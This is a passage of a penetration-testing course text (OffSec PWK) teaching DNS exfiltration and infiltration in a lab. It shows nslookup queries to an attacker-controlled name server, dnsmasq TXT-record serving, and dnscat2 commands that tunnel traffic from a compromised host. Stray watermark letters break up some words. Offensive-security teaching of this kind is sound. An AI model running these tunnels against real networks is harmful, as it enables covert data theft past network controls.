i
DefaultRoute setting: yes
z
LLMNR setting: yes
MulticastDNS setting: no
DNSOverTLS setting: no D
DNSSEC setting: no
DNSSEC supported: no
Current DNS Server: 10.4.50.64
DNS Servers: 10.4.50.64
Link 4 (ens192)
Current Scopes: DNS
DefaultRoute setting: yes
LLMNR setting: yes
MulticastDNS setting: no
DNSOverTLS setting: no
DNSSEC setting: no
DNSSEC supported: no
Current DNS Server: 10.4.50.64
DNS Servers: 10.4.50.64
Listing 603 - Checking the configured DNS server on PGDATABASE01.
PGDATABASE01’s DNS server is set to 10.4.50.64 (MULTISERVER03). It will query
MULTISERVER03 any time it needs a domain name resolved. But PGDATABASE01 has no
953 (The Tcpdump Group, 2022), https://www.tcpdump.org/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 625
Made in Morocco
Penetration Testing with Kali Linux
outgoing network connectivity, so it can’t communicate directory with FELINEAUTHORITY or our
Kali machine.
As an experiment, let’s use nslookup954 to make a DNS request for exfiltrated-data.feline.com.
database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp
Server: 127.0.0.53
Address: 127.0.0.53#53
** server can't find exfiltrated-data.feline.corp: NXDOMAIN
Listing 604 - Using nslookup to make a DNS request for exfiltrated-data.feline.corp
This returns an NXDOMAIN response that indicates the DNS request failed. This is expected
though, as we haven’t configured our DNS server to actually serve any records.
y
nslookup used the DNS server running on the localhost interface of 127.0.0.53.
This is normal as it’s the DNS resolver provided by the ksystemd-resolved955
service running on Ubuntu. It will forward the query to the DNS server that’s
configured by Netplan. However, it may cache results. If we receive outdated
s
DNS responses, we should try flushing the local DNS cache with resolvectl flush-
caches. We can also query the DNS server directly by appending the serve
o
address to the nslookup command. For example: nslookup exfiltrated-
data.feline.corp 192.168.50.64.
n
The tcpdump program on FELINEAUTHORITY captured DNS packets from MULTISERVER03.
i
z
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali:
tcpdump: verbose output sDuppressed, use -v[v]... for full protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A?
exfiltrated-data.feline.corp. (57)
04:57:40.721786 IP 192.168.118.4.domain > 192.168.50.64.65122: 26234 NXDomain 0/0/1
(57)
Listing 605 - DNS requests for exfiltrated-data.feline.corp coming in to FELINEAUTHORITY from MULTISERVER03.
In this case, we’ve received a DNS A record request for exfiltrated-data.feline.corp on
FELINEAUTHORITY. This happened because MULTISERVER03 determined the authoritative
name server for the feline.corp zone. All requests for any subdomain of feline.corp will be
forwarded to FELINEAUTHORITY. We didn’t tell Dnsmasq on FELINEAUTHORITY what to do with
requests for exfiltrated-data.feline.corp, so Dnsmasq just returned an _NXDomain__ response. We
can see this flow in the following diagram.
954 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Nslookup
955 (Ubuntu, 2022), https://manpages.ubuntu.com/manpages/xenial/man8/systemd-resolved.service.8.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 626
Made in Morocco
Penetration Testing with Kali Linux
y
k
Figure 265: The request flow after issuing an nslookup for exfiltrated-data.feline.corp
The steps where MULTISERVER03 sent queries to the sroot name servers and TLD name server
have been omitted here for simplicity. But in a normal network situation, these steps would
precede the request made to FELINEAUTHORITY.
o
An arbitrary DNS query from an internal host (with no other outbound connectivity) has found its
way to an external server we control. This mnay seem subtle, but it illustrates that we can transfer
small amounts of information (exfiltrated data) from inside the network to the outside, without a
direct connection, just by making DNS queries.
i
Exfiltrating small chunks of plaintzext data is one thing, but imagine we have a binary file we want
to exfiltrate from PGDATABASE01. How might we do that?
D
This would require a series of sequential requests. We could convert a binary file into a long hex
string representation, split this string into a series of smaller chunks, then send each chunk in a
DNS request for [hex-string-chunk].feline.corp. On the server side, we could log all the DNS
requests and convert them from a series of hex strings back to a full binary. We won’t go into
further details here, but this should clarify the general concept of DNS network exfiltration.
Now that we have covered the process of exfiltrating data from a network, let’s consider how we
might infiltrate data into a network.
The DNS specification includes various records.956 We’ve been making A record requests so far.
An A record response contains an IPv4 address for the requested domain name.
But there are other kinds of records, some of which we can use to smuggle arbitrary data into a
network. One of these is the TXT record. The TXT record is designed to be general-purpose, and
contains “arbitrary string information”.957
956 (Wikipedia, 2022), https://en.wikipedia.org/wiki/List_of_DNS_record_types
957 (IETF RFC, 2022), https://datatracker.ietf.org/doc/html/rfc1464
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 627
Made in Morocco
Penetration Testing with Kali Linux
C c
We can serve TXT records from FELINEAUTHORITY using Dnsmasq. First, we’ll kill our previous
dnsmasq process with a + . Then we’ll check the contents of dnsmasq_txt.conf and run
dnsmasq again with this new configuration.
kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts
# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.y
kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
k
dnsmasq: started, version 2.88 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-
Lua TFTP conntrack ipset nftset auth cryptohash DNsSSEC loop-detect inotify dumpfile
dnsmasq: warning: no upstream servers configured
dnsmasq: cleared cache
o
Listing 606 - Checking the TXT configuration file then starting Dnsmasq with it.
The dnsmasq_txt.conf contains two extra lines starting with “txt-record=”. Each of these lines
n
represents a TXT record that Dnsmasq will serve. Each contains the domain the TXT record is for,
then an arbitrary string attribute,958 separated by a comma. From these two definitions, any TXT
record requests for www.feline.corp should return the strings “here’s something useful!” and
i
“here’s something else less useful.”.
z
Let’s test this hypothesis. Back on PGDATABASE01, we’ll make a request for TXT records for
www.feline.corp with nslooDkup by passing the -type=txt argument.
database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
Server: 192.168.50.64
Address: 192.168.50.64#53
Non-authoritative answer:
www.feline.corp text = "here's something useful!"
www.feline.corp text = "here's something else less useful."
Authoritative answers can be found from:
database_admin@pgdatabase01:~$
Listing 607 - The TXT record response from www.feline.corp.
Success! We received the arbitrary string attributes that were defined in dnsconfig_txt.conf.
This is one way to get data into an internal network using DNS records. If we wanted to infiltrate
binary data, we could serve it as a series of Base64 or ASCII hex encoded TXT records, and
convert that back into binary on the internal server.
958 (IETF RFC, 2022), https://datatracker.ietf.org/doc/html/rfc1464
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 628
Made in Morocco
Penetration Testing with Kali Linux
In this section, we discussed how we might infiltrate or exfiltrate data through various types of
DNS records. In the next section we’ll get some hands-on experience with the dnscat2959
framework, which leverages these techniques to create a multipurpose DNS tunnel.
19.2.2 DNS Tunneling with dnscat2
We can use dnscat2960 to exfiltrate data with DNS subdomain queries and infiltrate data with TXT
(and other) records.
A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which
are configured to make queries to that domain) are run on compromised machines.
Let’s try out dnscat2. We’ll inspect traffic from FELINEAUTHORITY with tcpdump, filtering
specifically on UDP port 53 (udp port 53).
y
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali:
tcpdump: verbose output suppressed, use -v[v]... for fulkl protocol decode
listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Listing 608 - Starting tcpdump to listen for packets on UDP port 53.
C cs
We’ll kill our existing Dnsmasq process with a + and run dnscat2-server instead, passing
the feline.corp domain as the only argument. o
kali@felineauthority:~$ dnscat2-server feline.corp
n
New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documenitation may be out of date.
z
auto_attach => false
history_size (for new windows) => 1000
D
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...
Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):
./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp
To talk directly to the server without a domain name, run:
./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7
Of course, you have to figure out  yourself! Clients
will connect directly on UDP port 53.
dnscat2>
Listing 609 - Starting the dnscat2 server.
959 (Ron Bowes, 2022), https://github.com/iagox86/dnscat2
960 (Ron Bowes, 2022), https://github.com/iagox86/dnscat2
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 629
Made in Morocco
Penetration Testing with Kali Linux
This indicates that the dnscat2 server is listening on all interfaces on UDP/53.
Now that our server is set up, we’ll move to PGDATABASE01 to run the dnscat2 client binary. The
binary is already on the server for this exercise. However, we could have transferred the binary
from our Kali machine to PGDATABASE01 via our SSH connection using SCP.961
Thinking about exfiltration techniques (like DNS tunneling) may seem to present
a “chicken or the egg” problem.962 How do we get the DNS tunneling client onto a
host if we don’t have command execution? Exfiltration is simply a tool we’ll use
to transfer data. It should be coupled with an exploitation vector that provides
access to the target network.
y
We’ll run the dnscat2 client binary from the dnscat folder in the database_admin home directory,
with the feline.corp domain passed as the only argument.
k
database_admin@pgdatabase01:~$ cd dnscat/
database_admin@pgdatabase01:~/dnscat$ ./dnscat felsine.corp
Creating DNS driver:
domain = feline.corp
host = 0.0.0.0 o
port = 53
type = TXT,CNAME,MX
n
server = 127.0.0.53
Encrypted session established! For added security, please verify the server also
i
displays this string:
z
Annoy Mona Spiced Outran Stump Visas
D
Session established!
Listing 610 - The dnscat2 client running on PGDATABASE01.
The dnscat2 client reports that a session has been established. We can check for connections
back on our dnscat2 server.
kali@felineauthority:~$ dnscat2-server feline.corp
[sudo] password for kali:
New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.
auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]...
961 (SSH, 2022), https://www.ssh.com/academy/ssh/scp
962 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Chicken_or_the_egg
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 630
Made in Morocco
Penetration Testing with Kali Linux
Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):
./dnscat --secret=7a87a5d0a8480b080896606df6b63944 feline.corp
To talk directly to the server without a domain name, run:
./dnscat --dns server=x.x.x.x,port=53 --secret=7a87a5d0a8480b080896606df6b63944
Of course, you have to figure out  yourself! Clients
will connect directly on UDP port 53.
dnscat2> New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the samye string:
>> Annoy Mona Spiced Outran Stump Visas
k
dnscat2>
Listing 611 - The connection coming in from the dnscat2 client.
s
Our session is connected! DNS is working exactly as expected. Requests from PGDATABASE01
are being resolved by MULTISERVER03, and end uop on FELINEAUTHORITY.
n
When run without a pre-shared --secret flag at each end, dnscat2 will print an
authentication string. This is used to verify the connection integrity after the
encryption has been negotiaited.963 The authentication string in this case (“Annoy
Mona Spiced Outran Stumzp Visas”) is the same on both client and server, so we
know there’s no in-line tampering. Every time a connection is made, the
authentication string will change.
D
We can use our tcpdump process to monitor the DNS requests to feline.corp:
...
07:22:14.732111 IP 192.168.50.64.51077 > 192.168.118.4.domain: 29066+ [1au] TXT?
8f150140b65c73af271ce019c1ede35d28.feline.corp. (75)
07:22:14.732538 IP 192.168.118.4.domain > 192.168.50.64.51077: 29066 1/0/0 TXT
"b40d0140b6a895ada18b30ffff0866c42a" (111)
07:22:15.387435 IP 192.168.50.64.65022 > 192.168.118.4.domain: 65401+ CNAME?
bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp. (64)
07:22:15.388087 IP 192.168.118.4.domain > 192.168.50.64.65022: 65401 1/0/0 CNAME
a2890158e06d79fd12c560ffff57240ba6.feline.corp. (124)
07:22:15.741752 IP 192.168.50.64.50500 > 192.168.118.4.domain: 6144+ [1au] CNAME?
38b20140b6a4ccb5c3017c19c29f49d0db.feline.corp. (75)
07:22:15.742436 IP 192.168.118.4.domain > 192.168.50.64.50500: 6144 1/0/0 CNAME
e0630140b626a6fa2b82d8ffff0866c42a.feline.corp. (124)
07:22:16.397832 IP 192.168.50.64.50860 > 192.168.118.4.domain: 16449+ MX?
8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp. (64)
963 (Ron Bowes, 2022), https://github.com/iagox86/dnscat2#usage
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 631
Made in Morocco
Penetration Testing with Kali Linux
07:22:16.398299 IP 192.168.118.4.domain > 192.168.50.64.50860: 16449 1/0/0 MX
385b0158e0dbec12770c9affff57240ba6.feline.corp. 10 (126)
07:22:16.751880 IP 192.168.50.64.49350 > 192.168.118.4.domain: 5272+ [1au] MX?
68fd0140b667aeb6d6d26119c3658f0cfa.feline.corp. (75)
07:22:16.752376 IP 192.168.118.4.domain > 192.168.50.64.49350: 5272 1/0/0 MX
d01f0140b66950a355a6bcffff0866c42a.feline.corp. 10 (126)